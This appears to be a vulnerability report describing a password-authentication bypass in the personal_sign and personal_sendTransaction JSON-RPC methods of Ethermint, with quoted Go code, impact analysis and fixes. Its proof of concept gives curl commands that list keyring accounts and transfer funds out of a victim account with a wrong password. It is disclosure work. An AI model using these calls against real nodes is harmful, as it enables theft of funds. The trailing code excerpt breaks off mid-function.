### Title
Password Authentication Bypass in `personal_sign` and `personal_sendTransaction` JSON-RPC Methods — (`File: rpc/namespaces/ethereum/personal/api.go`)

### Summary
The `personal_sign` and `personal_sendTransaction` JSON-RPC methods accept a `password` parameter per the Ethereum `personal_` namespace specification, but the password is silently discarded. Any caller who can reach the JSON-RPC endpoint can sign arbitrary data or submit transactions from any account held in the node's keyring without supplying the correct password.

### Finding Description

The Ethereum `personal_` namespace specification requires the password to authenticate/decrypt the key before signing. In Ethermint's implementation, both `Sign` and `SendTransaction` in `PrivateAccountAPI` accept the password argument but immediately discard it using the blank identifier `_`:

```go
// personal/api.go L131
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)  // password never forwarded
}

// personal/api.go L145
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)  // password never forwarded
}
``` [1](#0-0) [2](#0-1) 

The backend `Sign` and `SendTransaction` implementations in `rpc/backend/sign_tx.go` likewise perform no password check — they only verify the address exists in the keyring and then call `SignByAddress` directly:

```go
// sign_tx.go L40-43
_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
// ...
if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil { ... }
``` [3](#0-2) 

The `personal_unlockAccount` method is also permanently stubbed out — it always returns `false, nil` without performing any unlock:

```go
// personal/api.go L122-126
func (api *PrivateAccountAPI) UnlockAccount(_ context.Context, addr common.Address, _ string, _ *uint64) (bool, error) {
    // TODO: Not supported.
    return false, nil
}
``` [4](#0-3) 

The `personal` namespace is registered as `Public: false` in `rpc/apis.go`, but this field is only metadata in the go-ethereum RPC framework and does not enforce any access control at the transport layer: [5](#0-4) 

### Impact Explanation

When the `personal` namespace is enabled and the JSON-RPC endpoint is reachable, any caller can:

1. Call `personal_sendTransaction` with a `from` address that exists in the node's keyring and any `to`/`value` fields — the node will sign and broadcast the transaction without verifying the supplied password. This enables unauthorized EVM-denom fund transfers from any keyring account.
2. Call `personal_sign` to obtain a valid ECDSA signature over arbitrary data from any keyring account without the password, enabling downstream signature-based authorization bypasses.

This maps to the **High** allowed impact: *"Ethereum transaction... signer verification bypass enabling... unauthorized account/code mutation"* and *"Public JSON-RPC... path... exposes a reachable route to the impacts above."*

### Likelihood Explanation

- The `personal` namespace is not in the default API list (`["eth", "net", "web3"]`), but it is a documented, supported namespace that operators explicitly enable for use cases such as automated signing or wallet management. [6](#0-5) 
- Once enabled, the JSON-RPC endpoint is typically bound to `0.0.0.0` in production deployments, making it reachable by any network client.
- The attacker only needs to know (or enumerate) an address held in the node's keyring — `personal_listAccounts` is also exposed in the same namespace and requires no authentication. [7](#0-6) 

### Recommendation

1. **Remove or reject the password parameter silently**: Either enforce password verification against the keyring backend (where supported), or return an explicit error if the password is non-empty and cannot be verified, rather than silently ignoring it.
2. **Gate signing on an explicit unlock state**: Implement a proper in-memory unlock map keyed by address+password, consistent with the Ethereum `personal_` spec. Signing should fail unless the account has been unlocked with the correct password.
3. **Warn operators**: Document clearly that enabling the `personal` namespace with a publicly accessible JSON-RPC endpoint grants any caller the ability to sign from and spend funds of all keyring accounts.
4. **Consider deprecating the `personal` namespace**: As noted in the code, `personal_unlockAccount` is permanently broken. The entire namespace provides a false security model on top of the Cosmos SDK keyring.

### Proof of Concept

With the `personal` namespace enabled (`json-rpc.api = "eth,net,web3,personal"`):

```bash
# Step 1: enumerate keyring accounts (no auth required)
curl -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: ["0xVICTIM_ADDRESS", ...]

# Step 2: send funds from victim account with a WRONG password — succeeds
curl -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"personal_sendTransaction",
    "params":[{
      "from":"0xVICTIM_ADDRESS",
      "to":"0xATTACKER_ADDRESS",
      "value":"0xDE0B6B3A7640000"
    }, "WRONG_PASSWORD_IGNORED"],
    "id":2
  }'
# Returns: transaction hash — funds transferred without correct password
```

The password `"WRONG_PASSWORD_IGNORED"` is discarded at `personal/api.go:131` (`_ string`) and never reaches any verification logic, so the transaction is signed and broadcast unconditionally. [1](#0-0) [8](#0-7)

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}
```
